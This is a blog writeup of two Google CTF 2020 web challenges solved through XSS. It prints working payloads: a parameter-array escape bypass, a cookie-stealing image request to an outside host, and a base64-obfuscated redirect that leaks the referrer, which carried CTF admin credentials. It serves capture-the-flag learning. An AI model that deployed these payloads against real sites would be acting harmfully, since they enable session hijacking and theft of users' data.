---
layout: post
title: googleCTF2020 web challenges writeup
date: 2020-08-23 16:28 +0300
author: pop_eax
categories: ["ctf-writeup", "web", "XSS"]
---

# PASTEURIZE

this was the easiest web challenge in the CTF

![decription](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/chall-info.png)

we have a paste sharing site

![main](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/main-site.png)

sharing a paste, we find that we can share our pastes with the admin (TJMike)<br/>

![paste](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/paste.png)

*interesting*

from what I have now, I can see that XSS is what I am supposed to look for
<br/>when testing for xss I always throw this payload to see how the sanitaization is being done
```html
<script>alert(1);</script>
```

checking the source code verifies the input is getting sanitaizied

<br/>while reading the source code I realized I missed that comment

![comment](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/comment.png)<br/>

![source-code](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/source-code.png)

looking at it I was able to verify that the sanitaization is only done on client side with DOMpurify

![DOMpurify](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/dompurify.png)

I tried to bypass DOMpurify and read the source code, but that led to nothing since the version used in here is safe.

at this point I thought to myself<br/>
DOMpurify shouldn't be bypassed since it's a really good project used everywhere
and the high number of solves to the challenge doesn't make me feel like we need to discover a 0day for such an easy challenge.<br/>

so I took it simply, and reviewd everything I have simply then an idea clicked in my mind 

```js
const note = "asdasd";
const note_id = "cb33322e-4b48-4d0f-a748-1e509be9645d";
const note_el = document.getElementById('note-content');
const note_url_el = document.getElementById('note-title');
const clean = DOMPurify.sanitize(note);
note_el.innerHTML = clean;
note_url_el.href = `/${note_id}`;
note_url_el.innerHTML = `${note_id}`;
```
what if we put a `"` in our input and get a DOM based XSS

![escaped](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/escaped.png)

aaand it's getting escaped.<br/>

*is that the end of it then ?*<br/>
nope, it's not I went back the server side source code and I saw something interesting

```js
/* Who wants a slice? */
const escape_string = unsafe => JSON.stringify(unsafe).slice(1, -1)
  .replace(/</g, '\\x3C').replace(/>/g, '\\x3E');
```
the comment was interesting, when I first looked at it I felt like it's a useless thing
since it encodes the greater/less than signs.

but the comment felt odd at this point, so I tried to play with the code locally.

![locally](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/locally.png)

now I understood why the slice is important.
I looked at examples online for JSON.stringify and saw that there's only 1 case that doesn't start with `"` which is when passing an object to it.

![object](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/object.png)

I fired up burp suite and sent a json object and the quotes wasn't there :( <br/>
that's because my input is getting passed to the backend as a string not as an object

![req](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/req.png)
![res](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/res.png)

I did some research and then I remembered that I can send raw objects with `param[]=thing` in http.

![req](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/evil-req.png)
![res](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/evil-res.png)

DONE

crafting this payload
```js
content[]=;alert(1);//
```

![alert](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/alert.png)
![alerted-source](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/alerted-source.png)

now time to hack TJMike
```js
content[]=;new Image().src="http://domain/"+(document.cookie);//
```

![flag](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/pasteurize/flag.png)

___

# TECH SUPPORT

![desc](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/desc.png)

this challenge was fairly simple but it had a lot of rabbit holes which was really interesting.

the app is a normal site with a admin chat service too
so basically it's xss

we have the following features: 

![features](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/features.png)

/flag

![flag-thing](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/flag-thing.png)

¯\\\_(ツ)_/¯


/me (profile)

![me](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/me.png)

in here I updated the address with this payload

```html
<script>alert(1);</script>
```

and it worked :) . <br/>
but that was so useless, since it's a self XSS and by no way the admin can access it since the address value is stored in the cookies.

**(╯°□°）╯︵ ┻━┻**

/chat (the interesting thing)

![chat](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/chat.png)

now inputting the pervious payload didn't really work
so I tried this

```html
<img src=X onerror=alert(1)>
```

*isn't this another self xss ?*<br/>
I thought the same too don't worry.

after submitting the form I new window popped up, which felt interesting<br/>
~~it's literally useless btw~~

![chat](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/chat-window.png)

now I got a random thought of trying to send an legit image and to check who fetches it

```html
<img src=domain.com>
```

and I got 2 requests :)

![reqs](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/reqs.png)

at this point I tried to grab the /flag and send to my server and it didn't work.<br/>
after researching it I realized it's not working because the XSS is triggering on another domain which is typeselfsub-support.web.ctfcompetition.com . <br/>

at this point I was trying to do some weird magical stuff like SOP bypasses and I thought about redirecting to the self xss at my profile somehow <br/>

***all of that is useless***

after sending a lot of requests I thought about leaking more info from what we have<br/>
so I started getting `document.thing` stuff and `document.referrer` returned something cool

the payload

```html
<img src=X onerror=eval(atob("d2luZG93LmxvY2F0aW9uID0gImh0dHBzOi8veG9yZWF4LmZyZWUuYmVlY2VwdG9yLmNvbS9sZWFrP3E9IiArIGRvY3VtZW50LnJlZmVycmVy"))>
```

spaces started messing, how the payload works so I base64 encoded it
so I decoded it with `atob` and executed it with `eval`
the decoded value

```js
window.location = "https://domain.com/leak?q=" + document.referrer
```

P.S: you can base64 encode in javascript with `btoa`

I got the following url from the bot
```
https://typeselfsub.web.ctfcompetition.com/asofdiyboxzdfasdfyryryryccc?username=mike&password=j9as7ya7a3636ncvx&reason={mypayload here}
```

then I went to that url and it auto logged me as admin :P

![admin](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/admin.png)

now going to /flag

![flag](https://github.com/pop-eax/blog/raw/gh-pages/images/googleCTF20/tech-support/flag.png)

and DONE

## references

[xss](https://portswigger.net/web-security/cross-site-scripting/)<br/>
tool used to get http requests [beeceptor](http://beeceptor.com/)